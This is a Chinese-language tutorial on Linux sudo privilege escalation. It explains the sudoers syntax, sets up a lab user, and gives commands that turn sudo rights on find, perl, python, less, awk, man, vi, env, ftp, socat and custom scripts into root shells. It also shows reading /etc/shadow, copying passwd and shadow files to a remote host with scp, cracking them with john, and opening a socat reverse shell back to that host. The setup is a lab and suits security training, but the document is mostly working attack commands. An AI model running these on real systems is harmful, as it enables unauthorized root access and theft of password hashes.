<a name="Uo2YP"></a>
# 0x01 简介
在Linux/Unix中，`/etc`中的 `sudoers` 文件是 sudo 权限的配置文件。sudo 这个词代表着`**Super User Do root**`**权限**。`Sudoers` 文件是存储具有 root 权限的用户和组，以 root 或其他用户身份运行部分或所有命令的文件。
<a name="B6O9f"></a>
# 0x02 Sudo语法配置
如果root 用户希望向任何特定用户授予 sudo 权限，则键入**visudo**命令，该命令将打开 sudoers 文件进行编辑。<br />kali:<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657557877162-162bc41e-5380-454f-b09d-b3fd76936250.png#averageHue=%23242935&clientId=u6ec4ea93-b9b8-4&from=paste&height=98&id=u38097fb5&originHeight=98&originWidth=429&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9547&status=done&style=none&taskId=uea056bc1-6aae-4618-ac25-12e2c614f87&title=&width=429)<br />Ubuntu:<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657557673400-986b4324-c955-444a-b5fe-e925cb270423.png#averageHue=%232d0922&clientId=u6ec4ea93-b9b8-4&from=paste&height=114&id=ue1a40ce1&originHeight=114&originWidth=483&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13343&status=done&style=none&taskId=u98d7c17b-00af-45d4-901e-a25cdff599b&title=&width=483)<br />CentOS7:<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657557962256-5cbe4fd3-7ffe-42b6-b928-f13ba27f65bd.png#averageHue=%23fefefd&clientId=u6ec4ea93-b9b8-4&from=paste&height=247&id=u81f305f3&originHeight=247&originWidth=590&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28833&status=done&style=none&taskId=ue04d04e0-e357-4474-a14b-5cc599e7e7b&title=&width=590)

   - (ALL:ALL) 也可以表示为 (ALL)
   - 如果找到 (root) 代替 (ALL:ALL) 则表示用户可以以 root 身份运行该命令。
   - 如果没有提及用户/组，则意味着 sudo 默认为 root 用户

配置示例：`test ALL=(root) NOPASSWD:/bin/cp`
<a name="hT9T8"></a>
# 0x03 Sudo提权方法
<a name="wQ1DQ"></a>
## 3.0 综合

1. 使用 `sudo -l` 查看可利用的sudo权限工具
2. 在 `https://gtfobins.github.io/` 搜索对应的工具名称，利用页面中的提示进行提权
<a name="g9ngs"></a>
## 3.1 CP Cat Find提权
<a name="QO1WO"></a>
### 1、环境配置
<a name="hV9mz"></a>
#### 1）编辑sudo配置文件
```bash
sudo useradd -r -m -s /bin/bash test
vim /etc/sudoers

test ALL=(root) NOPASSWD: /usr/bin/find,/usr/bin/cat,/usr/bin/cp
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657559233801-15d9282f-a7ee-45ee-872a-42d9cbfb1833.png#averageHue=%232f0a24&clientId=u6ec4ea93-b9b8-4&from=paste&height=90&id=u1c0ef9e5&originHeight=90&originWidth=616&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13144&status=done&style=none&taskId=u538999ee-2ad5-45cf-910d-61ccda26c61&title=&width=616)
<a name="nPs6S"></a>
#### 2）检测sudo权限
```bash
sudo -l
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657559310218-dd80a549-8745-4f87-b7d3-4b3fb29abd9e.png#averageHue=%232d0922&clientId=u6ec4ea93-b9b8-4&from=paste&height=139&id=u881aa7e6&originHeight=139&originWidth=1070&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23541&status=done&style=none&taskId=u17ba1db8-0112-41c0-8de4-62e5c1629d8&title=&width=1070)

<a name="EI0Lt"></a>
### 2、Find提权
<a name="KdbPl"></a>
#### 1）查看sudo权限
```bash
sudo -l
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657559310218-dd80a549-8745-4f87-b7d3-4b3fb29abd9e.png#averageHue=%232d0922&clientId=u6ec4ea93-b9b8-4&from=paste&height=139&id=FBcsF&originHeight=139&originWidth=1070&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23541&status=done&style=none&taskId=u17ba1db8-0112-41c0-8de4-62e5c1629d8&title=&width=1070)
<a name="wNF5o"></a>
#### 2）提权方法
```bash
sudo find /home -exec /bin/bash \;
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657559440956-f046723a-d882-4436-9650-2763385ed3e2.png#averageHue=%232d0923&clientId=u6ec4ea93-b9b8-4&from=paste&height=82&id=u72db99b2&originHeight=82&originWidth=469&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12563&status=done&style=none&taskId=u7ccac437-61f6-486a-bb37-9b5b4c5d072&title=&width=469)
<a name="NGJF6"></a>
### 3、Cat提权
<a name="UUlal"></a>
#### 1）查看sudo权限
```bash
sudo -l
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657559576529-bf1255cd-1b1f-4bdc-a105-ad19d5bbcb2c.png#averageHue=%232d0a23&clientId=u6ec4ea93-b9b8-4&from=paste&height=147&id=u460fb35b&originHeight=147&originWidth=564&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25124&status=done&style=none&taskId=udb3d3447-c6d0-47e1-8598-2f94b28ce00&title=&width=564)

<a name="JAxqi"></a>
#### 2）提权方法
由于cat没有直接提权的方法，可通过查看/etc/passwd和/etc/shadow通过john进行爆破
```bash
sudo cat /etc/shadow
```

<a name="hs9FN"></a>
### 4、CP命令提权
<a name="OebCC"></a>
#### 1）查看sudo权限
```bash
sudo -l
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657559792448-a104e833-40a1-44b1-9aa1-a4e2565b740a.png#averageHue=%232d0923&clientId=u6ec4ea93-b9b8-4&from=paste&height=133&id=u1aff0d02&originHeight=133&originWidth=562&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24748&status=done&style=none&taskId=u3823b216-e096-496a-b163-d3030771d2b&title=&width=562)
<a name="Aq8Ry"></a>
#### 2）提权方法
可以通过复制/etc/passwd，修改passwd文件，使用openssl生成用户密码，并添加用户账户到passwd文件中覆盖/etc/passwd文件
<a name="WpAnC"></a>
## 3.2 Perl Python Less Awk Man Vi 提权
<a name="Tb9E8"></a>
### 1、环境配置
<a name="DzlZQ"></a>
#### 1）编辑sudo配置文件
```bash
vim /etc/sudoers

test ALL=(root) NOPASSWD: /usr/bin/perl,/usr/bin/python,/usr/bin/less,/usr/bin/awk,/usr/bin/man,/usr/bin/vi

```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657560824381-e3c89c90-be7c-4159-bd5a-a63820d425f2.png#averageHue=%232e0a23&clientId=u6ec4ea93-b9b8-4&from=paste&height=93&id=u2db8b243&originHeight=93&originWidth=981&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14655&status=done&style=none&taskId=u253ed738-b9ac-4246-9e4f-6b9f4db0efb&title=&width=981)
<a name="P1FZI"></a>
#### 2、检测sudo权限
```bash
sudo -l
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657559989686-5dc2c895-472c-4b8a-b12d-21d6c99ccaff.png#averageHue=%233e285f&clientId=u6ec4ea93-b9b8-4&from=paste&height=135&id=uaf3b23fb&originHeight=135&originWidth=1332&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26196&status=done&style=none&taskId=u86b415e6-6531-474d-a824-1988cb0015c&title=&width=1332)

<a name="HeHaJ"></a>
### 2、Perl提权
<a name="KG315"></a>
#### 1）查看sudo权限
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657560036942-6f3b69d2-0949-40ba-b84f-629e4cc14d0f.png#averageHue=%232d0a24&clientId=u6ec4ea93-b9b8-4&from=paste&height=136&id=u9bfa4002&originHeight=136&originWidth=473&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22820&status=done&style=none&taskId=u669f50c6-da0b-4bf0-9cd4-384faf3f3ca&title=&width=473)
<a name="gxxnP"></a>
#### 2）提权方法
```bash
sudo perl -e 'exec "/bin/bash";'
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657560073494-cf1cfa0b-dd93-4f09-afe9-fdcdbc9435ae.png#averageHue=%235e6da9&clientId=u6ec4ea93-b9b8-4&from=paste&height=79&id=u1565ea22&originHeight=79&originWidth=438&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11462&status=done&style=none&taskId=u8badfa4a-4922-4eb6-8117-b99765d013d&title=&width=438)


<a name="aqtCr"></a>
### 3、Python提权
<a name="wROkV"></a>
#### 1）查看sudo权限
```bash
sudo -l
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657560116177-a8bea551-e7c8-4b1c-9f1d-97d2c7327cef.png#averageHue=%232d0a24&clientId=u6ec4ea93-b9b8-4&from=paste&height=140&id=u3040dd66&originHeight=140&originWidth=481&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23239&status=done&style=none&taskId=u75c06b63-2127-43b8-80f3-1f27d11233f&title=&width=481)

<a name="d3JFx"></a>
#### 2）提权方法
```bash
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657560179453-0d924909-a56b-4a15-a2d9-9485b18dc03e.png#averageHue=%23535c9b&clientId=u6ec4ea93-b9b8-4&from=paste&height=80&id=ub55d5e50&originHeight=80&originWidth=593&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13766&status=done&style=none&taskId=u0c65725b-253d-40a5-8099-b79967efa66&title=&width=593)

<a name="Tf8jf"></a>
### 4.Less提权
<a name="yNSfW"></a>
#### 1.查看sudo权限
```bash
sudo -l
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657560900924-fcbac84c-1042-4108-a866-720619659a76.png#averageHue=%232d0923&clientId=u6ec4ea93-b9b8-4&from=paste&height=141&id=u582bd56d&originHeight=141&originWidth=971&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26012&status=done&style=none&taskId=ub2d967a4-8996-499a-80b5-65422fbe1ec&title=&width=971)

<a name="sEhzd"></a>
#### 2.提权方法
```bash
sudo less /etc/hosts
```

输入`!bash`<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657560359550-4e81323c-5f06-4c7b-844b-742a9dda397e.png#averageHue=%232d0922&clientId=u6ec4ea93-b9b8-4&from=paste&height=200&id=u57460204&originHeight=200&originWidth=575&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26161&status=done&style=none&taskId=u60c126ae-5e26-42c4-b73b-42ad58cc533&title=&width=575)<br />显示提权成功<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657560374234-41941996-5864-415d-83b9-51db3fc225fe.png#averageHue=%232d0923&clientId=u6ec4ea93-b9b8-4&from=paste&height=80&id=u9e14105d&originHeight=80&originWidth=384&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10084&status=done&style=none&taskId=ub0deb8f4-d72e-4003-9322-c4fe230f1c8&title=&width=384)
<a name="Tb8QL"></a>
### 5.Awk提权
<a name="iePif"></a>
#### 1.查看sudo权限
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657560930723-3a1084a2-9dc6-4b86-8c83-09c3f8a55e52.png#averageHue=%232d0923&clientId=u6ec4ea93-b9b8-4&from=paste&height=143&id=u8afeebc4&originHeight=143&originWidth=970&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25952&status=done&style=none&taskId=uc64ac932-bb1c-45b4-bc31-05b7af16a9f&title=&width=970)
<a name="kQVss"></a>
#### 2.提权方法
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657560478198-521f669b-cca1-460c-9e52-17f045906215.png#averageHue=%234c4e8e&clientId=u6ec4ea93-b9b8-4&from=paste&height=84&id=u22f7f091&originHeight=84&originWidth=491&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14345&status=done&style=none&taskId=ucd48c288-fefd-4ff5-b150-cc15428bbb0&title=&width=491)
<a name="dENPX"></a>
### 6.Man提权
<a name="fsR1v"></a>
#### 1.查看sudo权限
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657560949723-0e0a5190-15be-4e2e-b010-636ce228cc05.png#averageHue=%232d0923&clientId=u6ec4ea93-b9b8-4&from=paste&height=142&id=u88b99fff&originHeight=142&originWidth=979&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26011&status=done&style=none&taskId=u1b0b95a5-8649-47f6-af1a-942575fdf61&title=&width=979)
<a name="QgxYD"></a>
#### 2.提权方法
```bash
sudo man man
```
输入`!bash`回车即可<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657560592311-f03f137a-6fdd-46b2-a6ec-b246eb1d418e.png#averageHue=%232d0923&clientId=u6ec4ea93-b9b8-4&from=paste&height=466&id=ud4a4ee90&originHeight=466&originWidth=741&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77103&status=done&style=none&taskId=ua9bc8e7b-6d33-4b5d-8a7f-f06e5c0b98e&title=&width=741)<br />结果如下<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657560623685-3c3071ca-8473-4700-8c8c-7d8b52edd3ac.png#averageHue=%232d0923&clientId=u6ec4ea93-b9b8-4&from=paste&height=86&id=u54ae95c3&originHeight=86&originWidth=354&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9257&status=done&style=none&taskId=u23ca147f-c6d1-4ca1-bc6e-1e91fff3eb3&title=&width=354)
<a name="pWeMj"></a>
### 7.Vi/Vim提权
<a name="Mjo4q"></a>
#### 1.查看sudo权限
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657560975408-763adb61-bc1c-4bc5-a623-caf39139a956.png#averageHue=%232d0923&clientId=u6ec4ea93-b9b8-4&from=paste&height=153&id=u17d900f6&originHeight=153&originWidth=982&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28316&status=done&style=none&taskId=u6ae25f2f-9b59-4c94-9255-bd551826fc8&title=&width=982)
<a name="ik7Td"></a>
#### 2.提权方法
sudo vi<br />输入`:!bash`<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657561044176-9f14368d-9524-4e03-a118-108ccdda898c.png#averageHue=%232d0922&clientId=u6ec4ea93-b9b8-4&from=paste&height=557&id=uc382991d&originHeight=557&originWidth=996&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45676&status=done&style=none&taskId=ua603e413-7779-4fa0-8d02-300702f8ec2&title=&width=996)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657561072600-561bd6fb-d930-46f8-a89f-4643b95d0456.png#averageHue=%232d0922&clientId=u6ec4ea93-b9b8-4&from=paste&height=109&id=u49392358&originHeight=109&originWidth=364&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10305&status=done&style=none&taskId=u249bc164-dd1c-420d-a665-0dfbc3d556a&title=&width=364)

<a name="X4NtS"></a>
## 3.3 Env FTP Scp Socat提权
<a name="wvfnb"></a>
### 1.环境配置
<a name="AMsSv"></a>
#### 1.编辑sudo配置文件
```bash
vim /etc/sudoers

test ALL=(root) NOPASSWD: /usr/bin/env,/usr/bin/ftp,/usr/bin/scp,/usr/bin/socat
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657812909970-1eb01872-fd40-4c68-bf3b-e6068e8a2410.png#averageHue=%232e0a23&clientId=u650b7d3f-c541-4&from=paste&height=99&id=udad6dfd8&originHeight=99&originWidth=743&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13514&status=done&style=none&taskId=u1b5c8cb7-997f-40d3-8a7e-ad1df6a6e39&title=&width=743)
<a name="b6d3f"></a>
#### 2.检测sudo权限
```bash
sudo -l
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657813057251-c161fc37-ec6b-4c3e-95cb-edd5d60cdece.png#averageHue=%232d0923&clientId=u650b7d3f-c541-4&from=paste&height=134&id=uf10499d9&originHeight=134&originWidth=1061&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24392&status=done&style=none&taskId=uaea5ca97-8be9-40b3-868d-dd21adc0c45&title=&width=1061)

<a name="JGzC3"></a>
### 2.Env提权
<a name="tv6D1"></a>
#### 1.查看sudo权限
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657812971476-1a926924-48c6-4cd2-8c3a-7ce4935f6560.png#averageHue=%232d0922&clientId=u650b7d3f-c541-4&from=paste&height=134&id=nZScR&originHeight=134&originWidth=1060&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25054&status=done&style=none&taskId=ub41b3d90-2dc6-45e4-a9f9-0528b895a80&title=&width=1060)

<a name="AUsWJ"></a>
#### 2.提权方法
```bash
sudo env /bin/bash
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657813170350-5b13a265-0025-4569-b1e8-d110e2f59e04.png#averageHue=%232d0923&clientId=u650b7d3f-c541-4&from=paste&height=78&id=uda924b2a&originHeight=78&originWidth=365&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10162&status=done&style=none&taskId=u87c5f44e-7b99-4e4a-99db-77717e3bb3d&title=&width=365)

<a name="En8oG"></a>
### 3.FTP提权
<a name="Gmp1q"></a>
#### 1.查看sudo权限
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657813219688-cc4c820c-f3f2-4cbc-ab97-a9add8326a2d.png#averageHue=%232d0923&clientId=u650b7d3f-c541-4&from=paste&height=144&id=uc526580b&originHeight=144&originWidth=712&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24486&status=done&style=none&taskId=u694a5af9-9114-4f26-b3f5-c5cedc036b0&title=&width=712)
<a name="yRQDo"></a>
#### 2.提权方法
```bash
sudo ftp
```

输入`!/bin/bash`<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657813272843-af42fad2-749e-473a-8f25-d9547ebb9125.png#averageHue=%232d0923&clientId=u650b7d3f-c541-4&from=paste&height=97&id=ud8720db2&originHeight=97&originWidth=352&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11669&status=done&style=none&taskId=u93fd159f-63ea-4628-91e5-eda1fb99741&title=&width=352)

<a name="c65Xk"></a>
### 4.Scp提权
<a name="XaA0o"></a>
#### 1.查看sudo权限
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657813367195-d75080e7-59a8-43a6-b00e-8a52379e93e1.png#averageHue=%232d0923&clientId=u650b7d3f-c541-4&from=paste&height=136&id=uda1a13c1&originHeight=136&originWidth=1063&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25486&status=done&style=none&taskId=ubb8d0b5f-e0e5-4bcd-951e-8eaf0486c24&title=&width=1063)
<a name="BhO3i"></a>
#### 2.复制/etc/passwd和/etc/shadow到远端服务器
```bash
sudo scp /etc/passwd kali@192.168.50.53:~/
sudo scp /etc/shadow kali@192.168.50.53:~/
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657814145652-b3e9e1c6-42c4-4ee8-ad40-b4e0fd7cbbfd.png#averageHue=%232d0922&clientId=u650b7d3f-c541-4&from=paste&height=210&id=u9ae54fe3&originHeight=210&originWidth=1592&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63520&status=done&style=none&taskId=ue02c202c-38a2-4a6d-ab7b-0b61e0ffaa2&title=&width=1592)

复制文件如下<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657814176190-fb54a3a3-125c-4a3c-a447-b34c901e4a7d.png#averageHue=%23272b36&clientId=u650b7d3f-c541-4&from=paste&height=60&id=uff82be3a&originHeight=60&originWidth=230&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5779&status=done&style=none&taskId=u67ba3cb3-bc03-4559-9077-f54450bcf15&title=&width=230)

<a name="bCmmr"></a>
#### 3.使用john爆破密码
```bash
unshadow passwd shadow > pass
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657814278310-48ea99b4-669f-45c0-ba9d-092648eee422.png#averageHue=%23262b3a&clientId=u650b7d3f-c541-4&from=paste&height=86&id=ud849361b&originHeight=86&originWidth=427&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13661&status=done&style=none&taskId=ud3e6217f-372e-4cc2-85ea-7212ffeb74c&title=&width=427)
```bash
john pass
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657814412101-952ae768-56c1-4f0c-8f3c-e493243106ba.png#averageHue=%23272c39&clientId=u650b7d3f-c541-4&from=paste&height=435&id=uc25ac62a&originHeight=435&originWidth=820&originalType=binary&ratio=1&rotation=0&showTitle=false&size=102267&status=done&style=none&taskId=u88bfb43e-35fb-495f-88ac-b56e36184f6&title=&width=820)

<a name="brcnC"></a>
### 5.Socat提权
<a name="qwulp"></a>
#### 1.查看sudo权限
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657814466630-4975d09e-941a-4eb8-8c69-df62d3fe7cf3.png#averageHue=%232d0923&clientId=u650b7d3f-c541-4&from=paste&height=127&id=u8914ed70&originHeight=127&originWidth=728&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24471&status=done&style=none&taskId=u4f5df6a6-69d3-4a51-8ee5-bac17b67a94&title=&width=728)

<a name="Qlz4K"></a>
#### 2.在kali中开启监听端口
```bash
socat file:`tty`,raw,echo=0 tcp-listen:1234
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657814516112-24880852-c639-4678-b972-43efd8c8c37f.png#averageHue=%23252834&clientId=u650b7d3f-c541-4&from=paste&height=57&id=u37667a22&originHeight=57&originWidth=538&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7005&status=done&style=none&taskId=u49425ab3-d9f3-4f18-9ac2-5ce16fe6d69&title=&width=538)
<a name="H297d"></a>
#### 3.在客户机上操作
```bash
sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.50.53:1234
sudo socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.50.53:1234
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657814972421-6703afea-7940-4b11-8ed4-c386ea0eaf59.png#averageHue=%232d0922&clientId=u5c0fbbb0-ca90-4&from=paste&height=71&id=u37fca2e3&originHeight=71&originWidth=835&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9051&status=done&style=none&taskId=ua8f11f86-699d-4bdf-aa19-05ed208d6c6&title=&width=835)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657815167307-4b5ed639-973d-4cd8-97f4-af71cc0ac60c.png#averageHue=%232d0922&clientId=u5c0fbbb0-ca90-4&from=paste&height=57&id=u91bef788&originHeight=57&originWidth=866&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9095&status=done&style=none&taskId=u223f17da-a22c-42df-8f2e-28e7cb679e9&title=&width=866)
<a name="y21Qw"></a>
#### 4.在kali已经获取到权限
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657814989982-ca049a6d-0686-4015-bf7e-b2a2625eb0bb.png#averageHue=%23252935&clientId=u5c0fbbb0-ca90-4&from=paste&height=93&id=ud2a0ba18&originHeight=93&originWidth=545&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12926&status=done&style=none&taskId=u0c58b321-42c7-4fcd-bde8-96109756e3e&title=&width=545)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657815196114-447cdc22-7ae1-4a37-8b52-602f74f1dc8a.png#averageHue=%23262a37&clientId=u5c0fbbb0-ca90-4&from=paste&height=71&id=u6738c2f2&originHeight=71&originWidth=534&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12322&status=done&style=none&taskId=u8fad0d10-4d50-4080-8458-480e727ea85&title=&width=534)
<a name="ouz6j"></a>
## 3.4 root权限shell脚本
获得系统或程序调用的任何类型脚本的可能性最大，可以是 Bash、PHP、Python 或 C 语言脚本中的任何脚本，假设想要为任何将在执行时提供 bash shell 的脚本授予 sudo 权限。
<a name="iIQ8n"></a>
### 1.环境配置
<a name="NNJ6j"></a>
#### 1.配置shell.py
```bash
mkdir /bin/scripts
vim /bin/scripts/shell.py
chmod u+x /bin/scripts/shell.py

```
```python
#! /usr/bin/python

import os
os.system("/bin/bash")
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657815302412-b09b3b82-3922-44cc-9974-1d0323a586e6.png#averageHue=%232d0923&clientId=u5c0fbbb0-ca90-4&from=paste&height=82&id=u4d386d2d&originHeight=82&originWidth=231&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6747&status=done&style=none&taskId=ue4e62864-e3a7-46bc-b863-5d067c15ed6&title=&width=231)
<a name="I4w0u"></a>
#### 2.配置shell.sh
```bash
vim /bin/scripts/shell.sh
```
```shell
#!/bin/bash

/bin/bash
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657815424749-d9f0cf2e-659a-44cd-bc38-00449617d2c1.png#averageHue=%232d0922&clientId=u5c0fbbb0-ca90-4&from=paste&height=90&id=ue3a28e0d&originHeight=90&originWidth=226&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3420&status=done&style=none&taskId=u2478b198-56d4-4579-b8b9-acaf4dd5884&title=&width=226)
<a name="L1LaC"></a>
#### 3.配置shell.c
```bash
vim shell.c
```
```c
#include<stdio.h>
#include<stdio.h>
#include<unistd.h>
#include<sys/types.h>

int main()
{
    setuid(geteuid());
    system("/bin/bash");
    return 0;
}
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657815488823-3f5f77bc-5f1c-4a47-b46b-84246797f67d.png#averageHue=%232e0a23&clientId=u5c0fbbb0-ca90-4&from=paste&height=206&id=u3ab92623&originHeight=206&originWidth=375&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13082&status=done&style=none&taskId=uc365a32b-1499-42d9-bf5e-0950d3fee6e&title=&width=375)
<a name="JiqQz"></a>
#### 4.编译shell.c文件
```bash
gcc shell.c -o /bin/scripts/shell
chmod 777 /bin/scripts/shell
chmod a+x /bin/scripts/shell.py
chmod a+x /bin/scripts/shell.sh
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657815969675-645d5dc0-7ca7-4cf0-807a-47037f0154a8.png#averageHue=%23361e4e&clientId=u5c0fbbb0-ca90-4&from=paste&height=78&id=u2a382269&originHeight=78&originWidth=432&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7982&status=done&style=none&taskId=u559734ef-676f-488f-916a-0ab099fba78&title=&width=432)

<a name="vDhMo"></a>
#### 5.配置sudo文件
```bash
test ALL=(root) NOPASSWD: /bin/scripts/shell.py,/bin/scripts/shell.sh,/bin/scripts/shell
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657816027029-e2d040bd-376a-4eb1-ba16-b39fbf6b4065.png#averageHue=%232f0b24&clientId=u5c0fbbb0-ca90-4&from=paste&height=81&id=u004b5360&originHeight=81&originWidth=812&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13522&status=done&style=none&taskId=u57e731b6-7203-4536-83e4-d55988e02e3&title=&width=812)
<a name="mfTC7"></a>
#### 6.查看sudo配置
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657816083117-35957c4d-77c8-420b-90bb-ee4158ec51c0.png#averageHue=%232d0923&clientId=u5c0fbbb0-ca90-4&from=paste&height=143&id=udc896e25&originHeight=143&originWidth=1068&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24042&status=done&style=none&taskId=u8f0f095b-43a8-4479-9e8a-1d2355e46c6&title=&width=1068)
<a name="iiPNE"></a>
### 2.shell.py提权
```bash
sudo /bin/scripts/shell.py
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657816125014-aa2e67d4-aa35-4a8d-8794-3fd587d0b039.png#averageHue=%232d0923&clientId=u5c0fbbb0-ca90-4&from=paste&height=76&id=u4bd7ad40&originHeight=76&originWidth=415&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10977&status=done&style=none&taskId=u8e508556-e701-415b-9dab-36cd821cd27&title=&width=415)
<a name="JWS9j"></a>
### 3.shell.sh提权
```bash
sudo /bin/scripts/shell.sh
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657816186441-25a8c7ce-85ca-4f49-b0c7-007906366b7c.png#averageHue=%232d0923&clientId=u5c0fbbb0-ca90-4&from=paste&height=78&id=ub84c0ccc&originHeight=78&originWidth=385&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10696&status=done&style=none&taskId=u728169b7-9d81-4e96-a129-9c1ebd430f7&title=&width=385)
<a name="f6m6y"></a>
### 4.shell提权
```bash
sudo /bin/scripts/shell
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1657816233584-4c1ae349-e876-49de-996d-2281fb91aa32.png#averageHue=%232d0923&clientId=u5c0fbbb0-ca90-4&from=paste&height=83&id=u3bd1700b&originHeight=83&originWidth=413&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10716&status=done&style=none&taskId=u2097a92b-58df-46de-a78b-6acd28754a9&title=&width=413)

<a name="L8pPR"></a>
# 0x04 链接

- [https://mp.weixin.qq.com/s/WLcxC41kd_E5CgTfhdzvkw](https://mp.weixin.qq.com/s/WLcxC41kd_E5CgTfhdzvkw)
